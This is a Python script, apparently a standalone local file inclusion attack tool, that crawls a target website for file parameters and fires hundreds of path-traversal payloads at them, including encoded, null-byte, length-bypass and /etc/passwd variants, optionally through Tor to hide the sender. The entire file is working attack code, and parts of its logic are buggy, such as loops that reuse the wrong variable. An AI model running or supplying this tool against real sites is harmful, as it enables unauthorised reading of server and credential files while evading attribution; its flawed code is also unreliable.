import requests
import regex as re
import os
import urllib.parse
import time
from optparse import OptionParser

print("---------------------------")
print("LFI Vulnerabillity Test")
print("Writen By: Reza Sarvani")
print("JoinUS ==> BitSecurityTeam")
print("---------------------------")

parser = OptionParser()

parser.add_option("-p", "--payloadtype", dest="ptype",
	help="Windows Payload (1) | Linux Payloads (2) | Both (3)")

parser.add_option("-u", "--targeturl", dest="turl",
	help="Target URL To Test For LFI Vulnerabillity")

parser.add_option("-d", "--delaytime", dest="dtime",
	help="How Much Delay Between Request (In Seconds)")

parser.add_option("-w", "--wait", dest="wtime",
	help="After How Much Successfull Exploit You Want To Be Asked Again For Continue")

parser.add_option("-t", "--tor", dest="tuse",
	help="Use Tor For Requests: (Y/N)")

parser.add_option("-a", "--attacktype", dest="atype",
	help="Which Type Of Payload You Want To Test Againt Your Target\n1) Absolute Path Bypass\n2) Non-Recursively Stripped\n3) URL Encode\n4) Double URL Encode\n5) Null Byte Injection\n6) Null Byte Injection + Extension Validation\n7) Start Path Validation\n8) Using 4096 Byte Bypass Payload\n9) All Bypass Methods")


(options, args) = parser.parse_args()

if not options.ptype:
    parser.error("You Need To Specify Payload Type Using -p Option")
else:
	kind = str(options.ptype)
if not options.turl:
	parser.error("You Nedd To Specify Target URL Using -u Option")
if not options.dtime:
	delay = 3
else:
	delay = int(options.dtime)
if not options.wtime:
	options.wtime = 10
else:
	wait_time = int(options.wtime)
if not options.atype:
	features_list = ["8"]
elif options.atype == "8":
	features_list = ["8"]
else:
	features_list = options.atype.split(",")
if not options.tuse:
	tor_use = "n"
else:
	tor_use = options.tuse.lower()

if tor_use == "y":
	SessionProxies = {
	'http':  'socks5://127.0.0.1:9050', 
	'https': 'socks5://127.0.0.1:9050'
	}

file_extensions = ["jpg","png","zip","php","rar","sql","xml","py","jar","msi","exe","apk","bat","bin","gif","jpeg","ico","svg","psd","bmp","jsp","asp"]

# Linux Payloads Path
linux_payloads2 = open('linux_paths.txt','r')
linux_payloads = []
for path in linux_payloads2.readlines():
	if "\n" in path:
		path = path[:-1]
		linux_payloads.append(rf"{path}")
	else:
		linux_payloads.append(rf"{path}")
linux_payloads2.close()
# Windows Payloads Path
windows_payloads2 = open('windows_paths.txt','r')
windows_payloads = []
for path in windows_payloads2.readlines():
	if "\n" in path:
		path = path[:-1]
		windows_payloads.append(rf"{path}")
	else:
		windows_payloads.append(rf"{path}")
windows_payloads2.close()

# All Payloads
all_payloads = linux_payloads + windows_payloads

# Choosing Correct Path
if kind == "3":
	payload_list = all_payloads
if kind == "2":
	payload_list = linux_payloads
if kind == "1":
	payload_list = windows_payloads

win_pay = r"\..\..\..\..\..\..\..\..\..\\"
lin_pay = r'/../../../../../../../../../../'

win_pay2 = r"\\....\\....\\....\\....\\....\\....\\....\\....\\...."
lin_pay2 = r'//....//....//....//....//....//....//....//....//....//....//'

url2 = options.turl
url = re.match(r"(https|http)\:\/\/.*\.(com|net|ir|org|gov)",url2).group(0)
print("Target URL: " + url)
print("---------------------------")
if tor_use == "y":
	try:
		r = requests.get(url, proxies=SessionProxies)
	except:
		print("[-] Tor Connection Can Not Be Stablished, Check Tor Configuration")
else:
	r = requests.get(url)

entry = []
u_entry = []


for item in file_extensions:
	Possible_Entry = re.compile(rf'\/\w+\?\w+\=[\w/-]+\.{item}') 
	mo = Possible_Entry.findall(r.text)
	try:
		for item in mo:
			if len(item) >= 1:
				entry.append(item)
	except:
		pass

for items in file_extensions:
	url_point = re.search(rf'(\?|&)\w+\=[\w-]+\.{items}', url2)
	if url_point is not None:
		url_entry = url_point.group(0)[1:]
		entry.append("/"+url_entry)
		
count = 0
final_entry = []
m_groups = []
allowed_ext = []
allowed_exts = []
for entrys in entry:
	if count == 0:
		m = re.search(r'[\w-]+\=', entrys)
		m_groups.append(m.group(0))
		final_entry.append(entrys)

		ae = re.search(r'\.\w+', entrys)
		allowed_ext.append(ae.group(0)[1:])
		count+=1
	else:
		m = re.search(r'[\w-]+\=', entrys)
		if entrys == m.group(0):
			pass
		elif m.group(0) in m_groups:
			pass
		else:
			final_entry.append(entrys)
		count+=1
print(f"[+] Found {len(final_entry)+len(u_entry)} Entry Point!")
print("[+] Trying To Exploit It...")
print("-------------------------------")
fpayload_list=[]
for payload in payload_list:
	if "/" in payload:
		seperator = [lin_pay,lin_pay2]
	else:
		seperator = [win_pay, win_pay2]

	# Using Seperator in Directory ../../../../
	for ent in final_entry:
		reg = r'\w+\.\w+'
		payload2 = seperator[0] + payload
		f_ent = re.sub(reg, payload2, entrys)
		f_ent = url + f_ent
		fpayload_list.append(f_ent)


	# Using Seperator2 in Directory //....//....
	if [True if "9" in features_list else "2" in features_list][0]:
		for ent in final_entry:
			reg = r'\w+\.\w+'
			payload2 = seperator[1] + payload
			f_ent = re.sub(reg, payload2, entrys)
			f_ent = url + f_ent
			fpayload_list.append(f_ent)

	# Length 4096 Byte Bypass
	if [True if "9" in features_list else "8" in features_list][0]:
		for ent in final_entry:
			reg = r'\w+\.\w+'
			length_bypass = ""
			for dot in range(1400):
				length_bypass+="../"
			payload212 = length_bypass + payload
			f_ent = re.sub(reg, payload212, entrys)
			f_ent = url + f_ent
			fpayload_list.append(f_ent)

	# Using Normal Path /etc/passwd
	if [True if "9" in features_list else "1" in features_list][0]:
		for ent in final_entry:
			reg = r'\w+\.\w+'
			f_ent = re.sub(reg, "/"+payload, entrys)
			f_ent = url + f_ent
			fpayload_list.append(f_ent)


	# Normal Path + Null Byte Injection + Allow Ext
	if [True if "9" in features_list else "1" and "6" in features_list][0]:
		for ent in final_entry:
			reg = r'[\w-]+\.\w+'
			if len(allowed_ext)>=1:
				for ill in allowed_ext:
					f_ent = re.sub(reg, "/"+payload+f"%00.{ill}", entrys)
					f_ent = url + f_ent
					fpayload_list.append(f_ent)

	# Normal Path + Null Byte Injection
	if [True if "9" in features_list else "1" and "5" in features_list][0]:
		for ent in final_entry:
			reg = r'[\w-]+\.\w+'
			f_ent = re.sub(reg, "/"+payload+f"%00", entrys)
			f_ent = url + f_ent
			fpayload_list.append(f_ent)


	# Normal Path + URL Encode
	if [True if "9" in features_list else "1" and "3" in features_list][0]:
		for ent in final_entry:
			reg = r'[\w-]+\.\w+'
			payload9 = urllib.parse.quote("/"+payload, safe='')
			f_ent = re.sub(reg, payload9, entrys)
			f_ent = url + f_ent
			fpayload_list.append(f_ent)



	# Null Byte Injection + Allow Ext
	if [True if "9" in features_list else "6" in features_list][0]:
		for ent in final_entry:
			reg = r'[\w-]+\.\w+'
			if len(allowed_ext)>=1:
				for ill in allowed_ext:
					payload11 = seperator[0] + payload
					f_ent = re.sub(reg, payload11+f"%00.{ill}", entrys)
					f_ent = url + f_ent
					fpayload_list.append(f_ent)


	# Null Byte Injection
	if [True if "9" in features_list else "5" in features_list][0]:
		for ent in final_entry:
			reg = r'[\w-]+\.\w+'
			payload12 = seperator[0] + payload
			f_ent = re.sub(reg, payload12+f"%00", entrys)
			f_ent = url + f_ent
			fpayload_list.append(f_ent)

	# Null Byte Injection 2
	if [True if "9" in features_list else "5" in features_list][0]:
		for ent in final_entry:
			reg = r'[\w-]+\.\w+'
			payload13 = seperator[1] + payload
			f_ent = re.sub(reg, payload13+f"%00", entrys)
			f_ent = url + f_ent
			fpayload_list.append(f_ent)

	# URL Encode
	if [True if "9" in features_list else "3" in features_list][0]:
		for ent in final_entry:
			reg = r'[\w-]+\.\w+'
			payload3 = seperator[0] + payload
			payload3 = urllib.parse.quote(payload3, safe='')
			f_ent = re.sub(reg, payload3, entrys)
			f_ent = url + f_ent
			fpayload_list.append(f_ent)

	# URL Encode + Port Sweeger
	if [True if "9" in features_list else "3" in features_list][0]:
		for ent in final_entry:
			reg = r'[\w-]+\.\w+'
			payload41 = r"..%252f..%252f..%252f..%252f..%252f..%252f" + payload
			f_ent = re.sub(reg, payload41, entrys)
			f_ent = url + f_ent
			fpayload_list.append(f_ent)

	# URL Encode + Port Sweeger + Null Byte Injection
	if [True if "9" in features_list else "3" and "5" in features_list][0]:
		for ent in final_entry:
			reg = r'[\w-]+\.\w+'
			payload42 = r"..%252f..%252f..%252f..%252f..%252f..%252f" + payload
			f_ent = re.sub(reg, payload42+f"%00", entrys)
			f_ent = url + f_ent
			fpayload_list.append(f_ent)

	# URL Encode + Port Sweeger + Null Byte Injection + Allow Ext
	if [True if "9" in features_list else "3" and "6" in features_list][0]:
		for ent in final_entry:
			reg = r'[\w-]+\.\w+'
			payload42 = r"..%252f..%252f..%252f..%252f..%252f..%252f" + payload
			if len(allowed_ext)>=1:
				for ill in allowed_ext:
					f_ent = re.sub(reg, payload42+f"%00.{ill}", entrys)
					f_ent = url + f_ent
					fpayload_list.append(f_ent)

	
	# Stripped + Port Sweeger
	if [True if "9" in features_list else "2" in features_list][0]:
		for ent in final_entry:
			reg = r'[\w-]+\.\w+'
			payload50 = r"....//....//....//....//....//" + payload
			f_ent = re.sub(reg, payload50, entrys)
			f_ent = url + f_ent
			fpayload_list.append(f_ent)


	
	# Start Path Bypass + Port Sweeger
	if [True if "9" in features_list else "7" in features_list][0]:
		for ent in final_entry:
			payload00=r"/var/www/images/../../../etc/passwd"
			reg = r'[\w-]+\.\w+'
			payload00 = payload00 + payload
			f_ent = re.sub(reg, payload00, entrys)
			f_ent = url + f_ent
			fpayload_list.append(f_ent)


	# Start Path Bypass + URL Encode + Port Sweeger
	if [True if "9" in features_list else "7" and "3" in features_list][0]:
		for ent in final_entry:
			payload00=r"/var/www/images/../../../etc/passwd"
			reg = r'[\w-]+\.\w+'
			payload00 = payload00 + payload
			payload00 = urllib.parse.quote(payload00, safe='')
			f_ent = re.sub(reg, payload00, entrys)
			f_ent = url + f_ent
			fpayload_list.append(f_ent)



	# URL Encode 2
	if [True if "9" in features_list else "3" in features_list][0]:
		for ent in final_entry:
			reg = r'[\w-]+\.\w+'
			payload31 = seperator[1] + payload
			payload31 = urllib.parse.quote(payload, safe='')
			f_ent = re.sub(reg, payload31, entrys)
			f_ent = url + f_ent
			fpayload_list.append(f_ent)


	# URL Encode With Null Byte Injection + Allowd Ext
	if [True if "9" in features_list else "3" and "6" in features_list][0]:
		for ent in final_entry:
			reg = r'[\w-]+\.\w+'
			payload4 = seperator[0] + payload
			payload4 = urllib.parse.quote(payload, safe='')
			if len(allowed_ext)>=1:
				for ill in allowed_ext:
					f_ent = re.sub(reg, payload4+f"%00.{ill}", entrys)
					f_ent = url + f_ent
					fpayload_list.append(f_ent)


	# URL Encode With Null Byte Injection
	if [True if "9" in features_list else "3" and "5" in features_list][0]:
		for ent in final_entry:
			reg = r'[\w-]+\.\w+'
			payload4 = seperator[0] + payload
			payload4 = urllib.parse.quote(payload, safe='')
			f_ent = re.sub(reg, payload4+f"%00", entrys)
			f_ent = url + f_ent
			fpayload_list.append(f_ent)

	# Double URL Encode With Null Byte Injection + Allow Ext
	if [True if "9" in features_list else "4" and "6" in features_list][0]:
		for ent in final_entry:
			reg = r'[\w-]+\.\w+'
			payload5 = seperator[0] + payload
			payload5 = urllib.parse.quote(payload, safe='')
			payload6 = urllib.parse.quote(payload5, safe='')
			if len(allowed_ext) >=1:
				for ill in allowed_ext:
					f_ent = re.sub(reg, payload6+f"%00.{ill}", entrys)
					f_ent = url + f_ent
					fpayload_list.append(f_ent)


	# Double URL Encode With Null Byte Injection
	if [True if "9" in features_list else "4" and "5" in features_list][0]:
		for ent in final_entry:
			reg = r'[\w-]+\.\w+'
			payload5 = seperator[0] + payload
			payload5 = urllib.parse.quote(payload, safe='')
			payload6 = urllib.parse.quote(payload5, safe='')
			f_ent = re.sub(reg, payload6+f"%00", entrys)
			f_ent = url + f_ent
			fpayload_list.append(f_ent)


	# Double URL Encode
	if [True if "9" in features_list else "4" in features_list][0]:
		for ent in final_entry:
			reg = r'[\w-]+\.\w+'
			payload7 = seperator[0] + payload
			payload7 = urllib.parse.quote(payload, safe='')
			payload8 = urllib.parse.quote(payload5, safe='')
			f_ent = re.sub(reg, payload8, entrys)
			f_ent = url + f_ent
			fpayload_list.append(f_ent)


def show_output():
	os.system("clear")
	print(f"[+] Found {len(final_entry)+len(u_entry)} Entry Point!")
	print("[+] Trying To Exploit It...")
	print(f"[+] Total Payload Number: [{len(fpayload_list)}]")
	print("-------------------------------")
	print(f"[-] Not Succussfull Attempts: [{Incorrect_hit}]")
	print(f"[+] Succussfull Attempts: [{correct_hit}]")
	for suc_pay in Success_payload:
		print(f"[**] {suc_pay}")

exploit_hit = 0
Incorrect_hit = 0
correct_hit = 0
Success_payload = []
for exploit_payload in fpayload_list:
	if tor_use == "y":
		try:
			exp_r = requests.get(exploit_payload, proxies=SessionProxies)
		except:
			print("[-] Tor Connection Can Not Be Stablished, Check Tor Configuration")
			break
	else:	
		exp_r = requests.get(exploit_payload)
	if re.match(r"^2", str(exp_r.status_code)):
		Success_payload.append(exploit_payload)
		exploit_hit+=1
		correct_hit+=1
		if exploit_hit == wait_time:
			continues = input("Do You Want To Continue With The Test (Y/N)? ")
			if continues.lower() == "y":
				exploit_hit = 0
			else:
				break
	else:
		Incorrect_hit+=1
	time.sleep(delay)
	show_output()



	
